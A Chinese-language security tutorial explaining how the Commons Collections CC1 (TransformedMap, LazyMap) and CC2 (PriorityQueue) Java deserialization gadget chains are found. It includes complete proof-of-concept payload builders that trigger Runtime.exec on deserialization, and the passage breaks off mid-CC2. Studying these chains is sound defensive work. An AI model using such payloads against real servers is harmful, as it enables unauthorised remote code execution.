&lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 预备知识： 动态代理，一句话总结就是：动态代理直接调用接口的方法，无需实现类。 反射 主流两个版本：TransformedMap，LazyMap TransformedMap版本PoC： 123456789101112131415161718192021222324252627282930313233343536public class CommonsCollections1_TransformedMap_Exploit &#123; public static void main(String[] args) throws Exception &#123; //1.客户端构建攻击代码 //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[]&#123;&#125; &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[]&#123;&#125; &#125;), new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"open /Applications/Calculator.app\"&#125;) &#125;; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChian Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //反射机制调用AnnotationInvocationHandler类的构造函数 Class cl = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); //取消构造函数修饰符限制 ctor.setAccessible(true); //获取AnnotationInvocationHandler类实例 Object instance = ctor.newInstance(Target.class, outerMap); //payload序列化写入文件，模拟网络传输 ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc1_transformedMap.ser\"))); fout.writeObject(instance); //2.服务端读取文件，反序列化，模拟网络传输 ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc1_transformedMap.ser\"))); //服务端反序列化，触发漏洞 fin.readObject(); &#125;&#125; 其他小型触发： 1234...Map map = new HashedMap();Map transformedMap = TransformedMap.decorate(map,chainedTransformer,null);map1.put(1,1); 1234567891011...//创建Map并绑定transformerChinaMap innerMap = new HashMap();innerMap.put(\"value\", \"value\");//给予map数据转化链Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);//触发漏洞Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式onlyElement.setValue(\"foobar\"); 利用链寻找这里我想从漏洞挖掘的角度去写，毕竟这是个老洞，我们更应该关注的是如何找到的。 还是那句话，上来找readObject复写点，非常多！只不过我们现在关注TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。 翻看commons-collections的文档可以发现： 该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换(transform)方法，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。 举个例子获得一个TransformedMap的实例，可以通过TransformedMap.decorate()方法： 1Map tansformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer); 可以看到三个参数，map，keyTransformer，valueTransformer 翻译过来：当TransformedMap内的key或者value发生变化时，就会触发相应参数的Transformer的transform()方法。 其实这句话值得引起我们的怀疑，transform参数是否可控？ 索性去找Transformer类，发现是一个接口，只有一个transform方法，find implementation(option+cmd+B)，一共14个： 先看第一个，ChainedTransformer： 这里的iTransformer属性是一个Transformer[]数组，并且发现在ChainTransformer的transform函数中，会依次对该数组里面的transformer依次进行transform方法(不同的Transformer实现类实现的transform不同，多态)。 而且这里有一个细节就是： 1object = this.iTransformers[i].transform(object); 这条语句放在了一个循环里面。 这也就导致上一次tranform方法的结果返回值会作为下一次transform的参数，越来越有链的感觉了！ 世界线展开 这时候我们可以寻找invoke函数的调用点。 其实这里我认为我们始终离不开找invoke这样的sink点环节，碰巧发现在InvokeTransformer有invoke方法的使用： 哦这熟悉的反射味道，血压拉满！ 如果这里input是可控的，按逻辑走，会获得input的Class对象，下一步想获取method对象，但是发现有两个参数iMethodName和iParamTypes。 往前翻构造函数： InvokerTransformer类就是今天的主角，因为他有RCE触发点。 InvokerTransformer这部分我们先按下不表，接下来就要寻找哪些方法可以调用InvokerTransformer类呢？逃不开之前找到的14个Transformer，因为他们实现了Transformer这个接口，都现实了transform方法。 我们接下来要找transform方法在哪被调用了： 看TransformedMap内部： 只有这三处调用了transform方法。 前两个都是本类方法，但是第三个checkSetValue方法是一个抽象方法，属于AbstractInputCheckedMapDecorator的抽象方法，它一共有两个类实现，TransformedMap算一个： 查找checkSetValue方法在哪可以被调用，发现在内部类MapEntry的setValue方法中调用了： 也就是说，只要一个类A继承了抽象类AbstractInputCheckedMapDecorator，那么A就会有内部类A.MapEntry，就可以A.MapEntry.setValue()执行方法。 我们的TransformedMap就是这样的一个A 寻找实现AbstractInputCheckedMapDecorator的类，一共有4个： 正好TransformedMap算一个。所以它既是readObejct复写点又是执行链的起点 世界线收束 构造PoC经典一句话，弹计算器： 1Runtime.getRuntime().exec(\"open /Applications/Calculator.app\"); 反射写法： 12Class clazz = Class.forName(\"java.lang.Runtime\"); clazz.getMethod(\"exec\", String.class).invoke(clazz.getMethod(\"getRuntime\").invoke(clazz), \"open /Applications/Calculator.app\"); 不清楚的可以看之前的博客 那现在要如何构造这句话呢？ 首先上一部分我们发现了InvokerTransformer有invoke触发点，用反射来出发。 重要的是每个参数如何对应赋值，看InvokerTransformer的第二个构造方法： 我们“一句话”到执行函数是exec，回去看看： exec的参数类型是String，所以InvokerTransformer构造函数的三个参数分别是： methodName = “exec” =&gt; iMethodName paramTypes = “new Class[]{String.class}” =&gt; iParamtypes iArgs = “new String[]{“open /Applications/Calculator.app”}” =&gt; iArgs 所以尝试写一个demo1.0： 123456789101112public static void main(String[] args) throws Exception &#123; InvokerTransformer it = new InvokerTransformer( \"exec\", new Class[]&#123;String.class&#125;, new String[]&#123;\"open /Applications/Calculator.app\"&#125; ); //得到Runtime.getRuntime()实例input Object input = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); //为了能触发exec.invoke(input,\"cmd\"),需要执行transform方法 it.transform(input);&#125; 问题来了，不会有人可以写好一个input在代码中等你，所以input需要写进payload。 所以接下来我们要去找：哪些类可以把input塞进去？ 由于这里input依赖了反射，所以我们最好在jar包里找到一个invoke的复写点，直接全局搜invoke，发现只有InvokerTransformer自己。 所以这里我们需要将input拆开，为了依赖不同的组件。 想法就是既然你ChainedTransformer的transform可以循环调用Transformer数组内的不同tranform方法，那么我们也去找若干个Transformer来将input分别承担。 首先我们感觉肯定是越简单越好，最好是直接出现一个Transformer可以直接返回一个Runtime.getRuntime() 这样第二步直接new InvokerTransformer()就可以了： 1new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"open /Applications/Calculator.app\"&#125;) 相当于： 1Runtime.getRuntime().invoke(method(exec),\"open /Applications/Calculator.app\") 寻找Transformer的实现类14个： 我们只想要一个Transformer帮我们承担Runtime.getRuntime()即可，其他最好什么都不做。 发现ConstantTransformer最合适： 完全都是简单的传递。 所以这时候demo2.0出现了： 12345678Transformer[] transformers = new Transformer[] &#123; //以下两个语句等同,一个是通过反射机制得到，一个是直接调用得到Runtime实例 // new ConstantTransformer(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\"))), new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[] &#123;String.class&#125;, new Object[] &#123;\"open /Applications/Calculator.app\"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); transformerChain.transform(null);//触发ChainedTransformer里面每一个人的transform 但是这版本仅仅在本地可以测试，因为Runtime类没有实现Serializable接口，所以无法传输。 所以我们就需要反序列化那一端机器的Runtime实例。 继续拆分： 12345Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class)，//先得到Class对象，Class支持Serializable new ConstantTransformer(\"getRuntime\",new Class[]&#123;&#125;,new Object[]&#123;&#125;),//得到getRuntime方法对象 new InvokerTransformer(\"exec\", new Class[] &#123;String.class&#125;, new Object[] &#123;\"open /Applications/Calculator.app\"&#125;)//将这个方法对象套在exec上 &#125;; 讲道理这样是可以的，但是实际上还是不行： 因为在InvokerTransformer的tranform中： 上来先input.getClass了，别忘了我们给的东西是Runtime.class，那结果肯定是Class对象java.lang.Class。 在java.lang.Class中寻找getRuntime对象肯定是找不到的。 所以这时候需要换一个思路：先拿到梯子，这里面的梯子就是getMethod方法 目标语句： 12目标语句Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\") 1234567894步走1.先获得getMethod的方法对象，这个方法在java.lang.Class中Method gm = Class.forName(\"java.lang.Class\").getMethod(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;)2.拿到之后，需要把getRuntime函数取出来。因为getMethod方法的作用就是返回一个method对象，所以直接invoke就行Method gr = gm.invoke(Class.forName(\"java.lang.Runtime\"),\"getRuntime\",new Class[]&#123;&#125;);3.准备用gm去把invoke引出来Method i = gm.invoke(Class.forName(\"java.lang.reflect.Method\"),\"invoke\")4.组合到一起i.invoke(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"open /Applications/Calculator.app\"&#125;) 晕的可以往下看： 失败版构造： 1234567Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class),//先获取Runtime实例 new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[]&#123;&#125; &#125;), //还需要填充，调用getRuntime得到Runtime实例,第一个参数是获取的方法，这里先获取getMethod方法，第二个是参数列表，这个是getMethod方法的参数列表，第三个参数是invoke方法的参数列表，这里我们想拿到getRuntime方法，这部分在经过transform函数处理之后，返回的是getRuntime()这样的一个Method方法 new InvokerTransformer(\"exec\", new Class[] &#123;String.class&#125;, new Object[] &#123;\"open /Applications/Calculator.app\"&#125;) //最后一轮是先获取exec方法，invoke方法的命令是“open /Applications/Calculator.app”&#125;; InvokerTransformer的参数包括(方法名a，a的参数类型，invoke的参数{对象，对象参数}) 我们认为可以，但实际上还是不行，原因： 在第二步出来之后，object是getRuntime，是method对象，一个Method对象是不能调用exec()的 所以我们这里还需要invoke函数的参与 所以我们还需要再来一步得到invoke函数： 123456789Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class),//先获取Runtime实例 new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[]&#123;&#125; &#125;), //还需要填充，调用getRuntime得到Runtime实例,第一个参数是获取的方法，这里先获取getMethod方法，第二个是参数列表，这个是getMethod方法的参数列表，第三个参数是invoke方法的参数列表，这里我们想先反射出来getRuntime参数，这部分在经过transform函数处理之后，返回的是getRuntime()这样的一个方法。 new InvokerTransformer(\"invoke\", new Class[]&#123;String.class,Object[].class&#125;, new Object[]&#123;null,new Object[]&#123;&#125;&#125;) //把invoke方法引出来，看好参数的类别，该占位占位 new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"open /Applications/Calculator.app\"&#125;) //最后一轮是先获取exec方法，invoke方法的命令是“open /Applications/Calculator.app”&#125;; 这里重点记录一下invoke环节的debug过程： 1234//input=getRuntime这个Method对象Class cls = input.getClass();//cls = java.lang.Method（getRuntime方法是Method类）Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //在method类中找到invoke方法，method=invoke方法return method.invoke(input, this.iArgs); //调用invoke方法，input=getRuntime这个方法，传入自定义的参数 最后一步其实就是： 1invoke.invoke(getRuntime(),new Object[]&#123;null,new Object[]&#123;&#125;&#125;); 发现一个骚东西： 123invoke.invoke(a,&#123;b,c&#125;) a.invoke(b,c) b.a(c) 套用在最后一句上： 12invoke.invoke(getRuntime(),null);getRuntime().invoke(new Object[]&#123;null,new Object[]&#123;&#125;&#125;) 这里为什么null可以呢？ 是因为getRuntime函数是static的，根本不需要obj来hold。 所以这里这两种写法都可以： 12new InvokerTransformer(\"invoke\", new Class[]&#123;String.class,Object[].class&#125;, new Object[]&#123;null,new Object[]&#123;&#125;&#125;)new InvokerTransformer(\"invoke\", new Class[]&#123;String.class,Object[].class&#125;, new Object[]&#123;Class.forName(\"java.lang.Runtime\"),new Object[]&#123;&#125;&#125;) 多说一句： 1getRuntime().invoke(new Object[]&#123;null,new Object[]&#123;&#125;&#125;) 这句话相当于： 12getRuntime() 后面都是寂寞getRuntime() =&gt; Runtime 实例 既然能返回Runtime实例，目标达成。 第四步debug： 1234//input=Runtime类实例Class cls = input.getClass();//cls = java.lang.Runtime Method method = cls.getMethod(\"exec\", new Class[] &#123;String.class&#125;); //在Runtime类中找到exec方法，method=exec方法return method.invoke(input, \"open /Applications/Calculator.app\"); //调用invoke方法 所以目前demo3.0: 1234567891011121314public static void main(String[] args) throws Exception &#123; //1.客户端构建攻击代码 //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;\"getRuntime\", new Class[]&#123;&#125;&#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[]&#123;&#125;&#125;), new InvokerTransformer(\"exec\", new Class[] &#123;String.class&#125;, new Object[] &#123;\"open /Applications/Calculator.app\"&#125;) &#125;; //将transformers数组存入ChainedTransformer Transformer transformerChain = new ChainedTransformer(transformers); //触发 transformerChain.transform(null);&#125; 我们最想要的是，transform方法最好也要自动触发，所以发现了checkSetValue方法，它会自动调用transform方法。 checkSetValue方法属于每一个继承了AbstractInputCheckedMapDecorator的类，TransformedMap算一个。 所以接下来我们的目标就变成了如何让TransformedMap自动调用transform方法。 我们的ChainedTransformer说到底就是一个Transformer，只要添加数据至map中就会自动调用tramsform，就会执行转换链执行payload。 这样我们就可以把触发条件从显性的调用转换链的transform函数延伸到修改map的值。很明显后者是一个常规操作，极有可能被触发。 举个例子获得一个TransformedMap的实例，可以通过TransformedMap.decorate()方法： 1Map tansformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer); 可以看到三个参数，map，keyTransformer，valueTransformer。 查看org.apache.commons.collections.map.TransformedMap#decorate源码： 到这里，触发条件就是更改map的值(key或者value)即可。 寻找readObject复写点感觉还是奇怪，需要服务端配合将反序列化内容反序列化为map，并对值进行修改。 如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了key-value修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。 在1.7中存在一个完美的复写点：sun.reflect.annotation.AnnotationInvocationHandler 关于AnnotationInvocationHandler类，这个类本身是被设计用来处理Java注解的。 看两处源码关键点： 补充为什么要传入Target.class? Target是Java提供的四个元注解之一(Target，Documented，Inherited) 1var2 = AnnotationType.getInstance(this.type) 我们回来看AnnotationType.getInstance(this.type)对@Target这个注解的处理。var2=getInstance会获取到@Target的基本信息，包括注解元素，注解元素的默认值，生命周期，是否继承等等。 1var3 = var2.memberTypes(); var3就是var2的键值对类型，可以取值Ljava.lang.annotation.ElementType类型的值。 这里其实占了Java注解的语法糖的便宜，Java注解默认都是value = XXXX，相当于蹭了个谐音梗。 为什么一定要Map(“value”, “value”)? 因为在 1Map var3 = var2.memberTypes();//var3 = &#123;value：ElementType&#125; 这就保证了在 123456789101112131415Map var3 = var2.memberTypes();// var3 = &#123;value：ElementType&#125;Iterator var4 = this.memberValues.entrySet().iterator(); // var4 是迭代器while(var4.hasNext()) &#123; Entry var5 = (Entry)var4.next();//var5 = &#123;value:value&#125; String var6 = (String)var5.getKey();// var6 = value Class var7 = (Class)var3.get(var6); //ElementType //从@Target的注解元素键值对&#123;value：ElementType的键值对&#125;中去寻找键名为key的值 //如果key的值不是value，那么这里就null，链就断掉了 if (var7 != null) &#123; //触发命令执行处 var5.setValue... &#125;&#125;&#125; 保证innerMap.put(&quot;value&quot;,&quot;xxxxxx&quot;)也是可以的，只要key的值为”value“就行。 su18师傅斧正su18师傅纠正我，其实这里并不一定是Target.class。。。 比如这里换成另一种注解：Generated.class 我们选最下面这个字段“comments”，那这个版本就是： debug跟一下： 这里和之前一样，var3是map，var4是迭代器，我们的终极目标是执行setValue var5就是entry，var6就是key（String类型），var7就是var3中var6对应的value，是String.class这个类对象。 var8是entry中的value，如果我们要执行setValue，就必须让var7.isInstance(var8)==false 也就是说： var8不能是String类型，所以这里HashMap的value不能再是“value”了，比如可以改成3，int类型就是可以的。 最终版本PoC最终版本PoC构造如下： 123456789101112131415161718192021222324252627282930313233343536public class CommonsCollections1_TransformedMap_Exploit &#123; public static void main(String[] args) throws Exception &#123; //1.客户端构建攻击代码 //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[]&#123;&#125; &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[]&#123;&#125; &#125;), new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"open /Applications/Calculator.app\"&#125;) &#125;; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChian Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //反射机制调用AnnotationInvocationHandler类的构造函数 Class cl = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); //取消构造函数修饰符限制 ctor.setAccessible(true); //获取AnnotationInvocationHandler类实例 Object instance = ctor.newInstance(Target.class, outerMap); //payload序列化写入文件，模拟网络传输 ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc1_transformedMap.ser\"))); fout.writeObject(instance); //2.服务端读取文件，反序列化，模拟网络传输 ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc1_transformedMap.ser\"))); //服务端反序列化，触发漏洞 fin.readObject(); &#125;&#125; 总结挖掘流程： 找readObejct复写点，发现了TransformedMap实现了，进去看一看，留个心 阅读文档，发现TransformedMap机制是一旦该Map中的元素发生了变化，都会调用Transformer的transform方法 发现Transformer的transform就是个接口中的方法 依次查看Transformer的实现类，发现ChainedTransformer中的transform会成环调用自身Transformer数组中的Transformer [支线任务开启]寻找invoke调用2点，发现InvokerTransformer内部的transform方法符合反射调用，有可控潜力 为了符合exp的构造条件，发现ConstantTransformer可以参与 将一句话分别由多个Transformer来hold，形成了ChainedTransformer，为了让ChainedTransformer.transform可以自动化调用，下一步需要去找哪里用了transform方法 查看transform的调用，发现TransformedMap类中有checkSetValue方法调用了transform方法 同时发现checkSetValue是抽象类AbstractInputCheckedMapDecorator的方法，同时该类内部静态类MapEntry的setValue方法调用了checkSetValue方法 实现AbstractInputCheckedMapDecorator的类有四个，TransformedMap算一个。所以TransformedMap1既是readObject复写点，又是执行链的起点(更改map中的值)[支线任务结束] 如何来自动更改值，还是去找readObejct复写点，发现AnnotationInvocationHandler十分合适，既复写了readObject，又修改了map的值，可以包装到最外面 编写Exp Exp利用流程： AnnotationInvocationHandler#readObject函数会在反序列化中被执行，并且会触发TransformedMap$EntrySet的setValue赋值。 EntrySet的构造函数是Set和AbstractInputCheckedMapDecorator类型。 由于TransformedMap继承了AbstractInputCheckedMapDecorator类，也就继承了AbstractInputCheckedMapDecorator内部的setValue方法。 setValue就是AbstractInputCheckedMapDecorator.MapEntry#setValue，他的内部会调用checkSetValue方法。 这里面的map是TransformedMap，所以TransformedMap版本的checkSetValue会调用transform方法，这个transform会调用TransformedMap自身的ConstantTransformer数组，循环调用。这个ConstantTransformer是通过decorate函数将ConstantTransformer配置进去的，最终payload执行。 这里值得细细地跟一下，TransformedMap并不是Map this.memberValues = [TransformedMap outMap] = (&lt;”value”,”value”&gt;，chain) TransformedMap自己没有entrySet，所以会执行距离它最近的父类的entrySet方法。 也就是AbstractInputCheckedMapDecorator的entrySet方法： 这里map的值为HashMap&lt;”value”,”value”&gt;，this是本类对象 TransformedMap outMap 调用的是本类内部类EntrySet的构造函数 所以这个Entry函数ruturn回去就是一个AbstractInputCheckedMapDecorator$EntrySet的对象，结构是(注意他们的类别)： &lt;&lt;”value”,”value”&gt;,outMap&gt;就是var5 接下来会执行iterator方法，这个方法AbstractInputCheckedMapDecorator#EntrySet也做了实现： 可以看出，实现了对collection的迭代器和parent的操作 跟进去看EntrySetIterator的实现： 返回一个迭代器就是var4，是。 接下来，var5=var4.next() 跟进去next方法： 好家伙，直接返回了一个MapEntry,entry是entry，parent一直都是TransformedMap outMap 这下终于理清了，是cc直接搞得鬼。 var5就是AbstractInputCheckedMapDecorator$MapEntry类 接下来之后对var5进行setValue调用，由于var5是AbstractInputCheckedMapDecorator$MapEntry对象，所以会执行自己的setValue方法： 由于这里parent一直是TransformedMap对象outMap，所以调用的是TransformedMap的checkSetValue方法： 可以看到，这时候outMap一直帮我们存着的chain原来放在了valueTransformer的属性里，也就自然会被执行了。 接下来就是熟悉的情节了： 触发。 LazyMap版本LazyMap也调用了transform方法。 利用链寻找对Transformer接口中的transform方法find usage： get方法首先判断map中是否已有该key，如果不存在，最终会到factory.transform进行处理。 能发现decorate方法可以new一个LazyMap方法，如果factory可控，就很有搞头了。 接下来要找找哪些方法会调用LazyMap的get方法(最好是readObject内部会用到，最契合的条件，可惜没有) 坑点记录：记一次对线rt.jar 发现AnnotationInvocationHandler内部的invoke调用了get方法： 我们可以发现在这个类中，memberValues是Map对象，并且有对map的get操作。 LazyMap也是Map的子类，重写了get方法，所以这里如果memberValues是LazyMap类对象，会成功调用LazyMap的get方法，就可以触发漏洞。 所以如何触发这个invoke函数呢？ PoC构造需要依赖动态代理，参考之前的博客： 总结就是被动态代理的对象调用任意方法都会调用对应的InvocationHandler的invoke方法。 写个小例子好理解： 目前已有条件： AnnotationInvocationHandler的readObject方法可以触发setValue， cc里面很多Map的setValue方法可以调用transform方法 LazyMap的invoke可以调用Map.get方法，LazyMap重写的get方法可以触发transform方法 ChainedTransformer的transform方法可以将里面InvokerTransformer的内容进行成环invoke触发 这个感觉就像： handler是一个InvocationHandler类对象，他内部有invoke方法 我们可以做一个代理类a，让这个代理类代理LazyMap对象,handler也参与，负责invoke 这样的话，无论以后a调用了LazyMap内部的任何方法，他都会先走一遍handler的invoke方法。 注意最后一句话，我们想让”他都会先走一遍handler的invoke方法”，handler的invoke方法，就是LazyMap的invoke方法。 抱着这个目标，我们还可以发现: AnnotationInvocationHandler继承了InvocationHandler，它也可以当动态代理，也可以作为handler 所以我们可以： 先拿到AnnotationInvocationHandler的构造函数cons 先用cons做一个AnnotationInvocationHandler的实例h1，h1的memberValues属性是一个LazyMap(包装好innermap和chain) 再用h1参与Proxy.newProxyInstance，去做一个LazyMap的代理实例mapProxy 再用cons去做一个AnnotationInvocationHandler的实例h2，h2的memberValues属性是mapProxy 这时候h2作为payload，参与序列化操作。 我们主要关注反序列化： 断点下到第一个readObject位置，java.io.ObjectInputStream#readSerialData： slots数组里面的内容就是h2，可以看到类型是AnnotationInvocationHandler 接下来会走到java.io.ObjectInputStream#invoke方法，可以看到ma=readObject，obj=h2 先在AnnotationInvocationHandler.readObject下断点，然后over-step: 果然进入到readObject方法，理论上现在this.memberValues就是我们传进来的mapProxy参数。 mapProxy是一个动态代理，它代理了LazyMap这个类，handler是h1。 那么这里一但mapProxy调用了任何方法，都会走handler(h1)的invoke方法，this.memberValues.entrySet()就是一次调用 这里可以先在AnnotationInvocationHandler类的invoke处下一个断点，然后step-over： 这里继续往下看，发现AnnotationInvocationHandler类的invoke调用了this.memberValues.get()： 这会再一次触发h1的invoke函数，并且现在this.memberValues的值为h1的参数，类型是LazyMap，factory就是lazymap属性，就是我们传进去的chain，的那么就会进入LazyMap.get方法： LazyMap.get内部就会有transform方法： 如果当前factory是我们的chain，那就会触发RCE。 1234567ObjectInputStream.readObject() -&gt; AnnotationInvocationHandler.readObject() -&gt; this.memberValues.entrySet() = mapProxy.entrySet() -&gt; AnnotationInvocationHandler.invoke() -&gt; this.memberValues.get(xx) = LazyMap.get(not_exist_key) -&gt; ChainedTransformer.transform() -&gt; InvokerTransfomer.transform() -&gt; RCE 最终版本PoC12345678910111213141516171819202122232425262728293031323334353637public class CommonsCollections1_LazyMap_Exploit &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers_exec = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;\"getRuntime\",null&#125;), new InvokerTransformer(\"invoke\",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"open /Applications/Calculator.app\"&#125;) &#125;; Transformer chain = new ChainedTransformer(transformers_exec); HashMap innerMap = new HashMap(); innerMap.put(\"value\",\"abcd\"); Map lazyMap = LazyMap.decorate(innerMap,chain); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class); cons.setAccessible(true); // 创建携带着LazyMap的AnnotationInvocationHandler实例h1 InvocationHandler h1 = (InvocationHandler) cons.newInstance(Target.class,lazyMap); // 创建LazyMap的动态代理类实例 Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(), h1); // 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues InvocationHandler h2 = (InvocationHandler)cons.newInstance(Target.class, mapProxy); //payload序列化写入文件，模拟网络传输 ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc1_LazyMap.ser\"))); fout.writeObject(h2); //2.服务端读取文件，反序列化，模拟网络传输 ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc1_LazyMap.ser\"))); //服务端反序列化，触发漏洞 fin.readObject(); &#125;&#125; cc2条件： commons-collections4: 4.0 jdk1.7 1.8低版本 maven： 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 预备知识： javassist JVM类加载机制 利用链寻找第一件事依然是寻找readObject复写点，这次盯上的是jdk的PriorityQueue： PriorityQueue 优先级队列是基于优先级堆的一种特殊队列 , 它满足队列 “ 队尾进 , 队头出 “ 的特点 队列中每次插入或删除元素时 , 都会调用 Comparator 方法对队列进行调整 缺省情况下 , 优先级队列会根据自然顺序对元素进行排序 , 形成一个最小堆( 父节点的键值总是小于或等于任何一个子节点的键值 ) . 当指定了Comparator后 , 优先级队列会根据Comparator的定义对元素进行排序. 梳理了一下PriorityQueue类的流程： 可以看到queue和comparator都是进行了可控性的传递。 那这里我们继续寻找哪些实现了Comparator接口的类拥有compare方法，目标锁定到TransformingComparator： 哦这熟悉的transformer.transform 可控！ 但是他并不像ChainedTransformer一样是成环transform，仅仅调用了一次Comparator.compare。 TransformingComparator版本最终版本PoC这里完全可以借助这一点，写一版PoC： 1234567891011121314151617181920212223242526272829303132public class CommonsCollections2_TransformingComparator_Exploit &#123; public static void main(String[] args) throws Exception &#123; Transformer[] raw_payload = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[]&#123;&#125; &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[]&#123;&#125; &#125;), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new Object[]&#123;\"open /Applications/Calculator.app\"&#125;)&#125;; ChainedTransformer chain = new ChainedTransformer(raw_payload); TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(2); queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,comparator); try&#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc2_TransformingComparator.ser\"))); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc2_TransformingComparator.ser\"))); inputStream.readObject(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 细节 为什么put了两个值： 因为在heapify方法实现如下： 这里只有size&gt;1才能进入循环。 add做了什么事？ 两次add做了什么事，这里要force-step(红色的小箭头)进入 调用梳理如下： 1add() -&gt; offer() -(第二次才会)-&gt; siftUp() -&gt; siftUpComparable() 第二次： 由于我们没有设置comparator，所以会进入else分支： 